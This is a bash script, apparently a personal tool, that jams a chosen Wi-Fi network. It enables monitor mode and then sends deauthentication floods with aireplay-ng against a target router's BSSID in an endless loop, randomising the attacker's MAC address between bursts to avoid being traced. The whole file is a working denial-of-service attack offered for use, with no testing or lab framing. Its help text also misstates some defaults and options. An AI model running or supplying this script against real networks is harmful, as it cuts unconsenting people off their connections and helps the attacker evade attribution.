#! /bin/bash

# usage:
# sudo ./jam_wifi.sh -b <bssid> -c <channel> -f <frequency> <interface>

USER_INTERFACE=${@:$#}
frequency=15
nbpps=1024
wait=0

while getopts ':b::c::f::x:h' opt; do
  case "$opt" in
    b) bssid=$OPTARG ;;
    c) channel=$OPTARG ;;
    h) help=true ;;
    f) frequency=$OPTARG ;;
    w) wait=$OPTARG ;;
    x) nbpps=$OPTARG ;;
    :) echo "Option -$OPTARG requires an argument" ;;
  esac
done

if [ "$help" = true ] || [ -z "$1" ] || [ "$1" = "--help" ]; then
  echo Usage:
  echo "sudo ./jam_wifi.sh -b <bssid> -c <channel> <interface>"
  echo
  echo Options:
  echo "-b        BSSID of the router (required)"
  echo "-c        Channel of the router (required)"
  echo "-f        Frequency of hits between MAC change (default: 20, 0 is infinite)"
  echo "-h        Print help"
  echo "-x        Number of packets per second (default: 1024, max: 1024)"
  echo "-w        Wait between attempts (default: 0)"
  echo
  echo Requirements:
  echo "- aircrack-ng"
  echo "- ifconfig (if on Kali 2.0, alias ifconfig to /sbin/ifconfig)"
  echo "- macchanger"
  exit 1
fi

if [ -z "$bssid" ]; then
  echo "ERROR: BSSID required"
  exit 1
fi
if [ -z "$channel" ]; then
  echo "ERROR: Channel required"
  exit 1
fi

echo --------------------------------------------------------------------------
echo WARNING
echo --------------------------------------------------------------------------
echo "This is an infinitely running script, it will not stop until you stop it"
echo

echo --------------------------------------------------------------------------
echo Anonymizing Mac
echo --------------------------------------------------------------------------
sudo ifconfig $USER_INTERFACE down
sudo macchanger -r $USER_INTERFACE
sudo ifconfig $USER_INTERFACE up

echo
echo --------------------------------------------------------------------------
echo Configuring network
echo --------------------------------------------------------------------------
sudo airmon-ng check
echo Killing processes
sudo airmon-ng check kill > /dev/null
read INTERFACE <<< $(sudo airmon-ng start $USER_INTERFACE | grep 'phy0' | awk ' { print $2 }')
echo Monitor Mode Active
echo New Interface: $INTERFACE

while true
do
  echo
  echo --------------------------------------------------------------------------
  echo Changing channel
  echo --------------------------------------------------------------------------
  sudo iwconfig $INTERFACE channel $channel
  echo New channel: $channel
  echo
  echo --------------------------------------------------------------------------
  echo Jamming $bssid
  echo --------------------------------------------------------------------------
  sudo aireplay-ng -0 $frequency -x $nbpps -a $bssid $INTERFACE
  echo
  echo --------------------------------------------------------------------------
  echo Anonymizing Mac
  echo --------------------------------------------------------------------------
  sudo ifconfig $INTERFACE down
  sudo macchanger -r $INTERFACE
  sudo ifconfig $INTERFACE up
  echo
  echo --------------------------------------------------------------------------
  echo Verify Mac
  echo --------------------------------------------------------------------------
  sudo macchanger $INTERFACE
  echo
  echo --------------------------------------------------------------------------
  echo Waiting
  echo --------------------------------------------------------------------------
  sleep $wait
done
